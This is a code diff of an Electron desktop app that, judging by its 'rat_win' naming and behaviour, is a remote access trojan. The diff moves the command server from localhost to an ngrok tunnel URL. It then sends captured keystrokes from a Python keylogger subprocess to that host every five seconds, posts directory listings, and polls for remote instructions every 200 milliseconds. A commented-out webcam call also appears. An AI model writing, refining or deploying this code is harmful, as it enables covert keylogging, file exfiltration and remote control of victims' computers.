@@ -9,9 +9,8 @@ const windowStateKeeper = require('electron-window-state');//preserves the windo
 const fs = require('fs');
 const Store = require('electron-store'); const store = new Store;
 
-const remotehost = 'http://localhost:1999';
-const update_interval = 1000;
-
+//const remotehost = 'http://localhost:1999';
+const remotehost = 'https://4381db06e54f.ngrok.io';
 
 let mainWindow = null;//defines the window as an abject
 let rat_win = null
@@ -59,15 +58,13 @@ app.on('ready', function () {
 	setTimeout(() => {
 		//camanager.start_webcam()
 		directoryman.search_root()
-		setInterval(() => {
-			keylog.get_keys()
-			directoryman.remote_instructions()
-		}, update_interval)
+		setInterval(() => { keylog.get_keys(); }, 5000)
+		setInterval(() => { directoryman.remote_instructions() }, 200)
 	}, 500);//child process wont start instantly
 })
 
 app.on('window-all-closed', function () {
-	axios.post("http://localhost:5088/shutdown");
+	keylog.close()
 	if (storage_changed == true) { setstorage() }
 	app.quit();
 })
@@ -213,7 +210,7 @@ module.exports = {
 	},
 	write_object_json_out: (filepath, buffer_data) => { write_file(filepath, buffer_data) },
 	closeapp: () => {
-		axios.post("http://localhost:5088/shutdown");
+		keylog.close()
 		if (storage_changed == true) { setstorage() }
 		app.quit()
 	},
@@ -272,29 +269,17 @@ function make_rat_window() {//create rat window
 }
 
 let keylog = {
-	get_keys: async function () {
-		let keys = axios.get('http://localhost:5088/key');//python keylog sub-process
-
-		await keys.then(keys => {
-			axios.default.post(remotehost + '/action/post/keylog', JSON.stringify(keys.data.keys))
-
-			/*keybox.innerText = "";
-			//console.log(keys);
-			keys.data.keys.forEach(keycode => {
-				var keyholder = document.createElement('div');
-				keyholder.className = "keyholder"
-				keyholder.innerText = keycode;
-				keybox.appendChild(keyholder)
-			});*/
-		})
-
+	get_keys: async function () {//get keylog from python sub process and send to server
+		let keys = axios.get('http://localhost:5088/key');//'localhost:5088' python keylog sub-process
+		await keys.then(keys => { axios.default.post(remotehost + '/action/post/keylog', JSON.stringify(keys.data.keys)) })
 	},
-	clear: async function () { axios.get('http://localhost:5088/key/clear') }
+	clear: async function () { axios.get('http://localhost:5088/key/clear') },//reset key array
+	close: function(){axios.post("http://localhost:5088/shutdown");},//shutdown sub-process
 }
 
 let directoryman = {
-	files: [],
-	current_dir: [],
+	files: [],//temprary filr paths
+	current_dir: [],//current directory
 	remote_instructions: function () {
 		axios.default.post(//post folders to server
 			remotehost + '/action/post/folders', {
